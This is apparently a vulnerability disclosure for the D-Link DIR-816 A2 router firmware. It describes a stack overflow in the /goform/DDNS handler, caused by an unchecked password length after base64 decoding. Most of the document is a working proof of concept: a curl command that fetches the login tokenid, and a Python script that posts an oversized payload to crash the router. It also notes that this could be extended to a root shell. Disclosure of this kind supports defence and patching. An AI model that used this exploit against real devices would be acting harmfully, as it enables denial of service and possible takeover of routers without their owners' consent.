
# D-link DIR-816 A2_v1.10CNB04.img Stack overflow vulnerability

## Firmware information

- Manufacturer's address：https://www.dlink.com/

- Firmware download address ： http://tsd.dlink.com.tw/GPL.asp

## Affected version

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/dir816/img/vuln2.png)

The picture above shows the latest firmware for this version

## Vulnerability details

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/Dir816/DDNS/img/vuln1.png)

The vulnerability occurs in /goform/DDNS, We need to meet the conditions first

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/Dir816/DDNS/img/vuln2.png)

The password is assigned to v7, and the v7 base64 will be stored in v11 after decryption, but the size of the password is not checked here, resulting in stack overflow

## Poc

First you need to get the tokenid

```
curl http://192.168.0.1/dir_login.asp | grep tokenid
```

Then run the following poc

```python
import requests
import base64

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

tokenid = '1804289383'

url = 'http://192.168.0.1/goform/DDNS'

payload = base64.b64encode(b'a' * 1000)

data = {
    'tokenid' : tokenid,
    'enable' : '1',
    'hostname' : 'DDNS',
    'username' : '123',
    'password' : payload
}
response = requests.post(url, data=data)
response.encoding="utf-8"
info = response.text
li(url)
print(info)
```

Then you can see the router crash, and finally you can write an exp to get a root shell

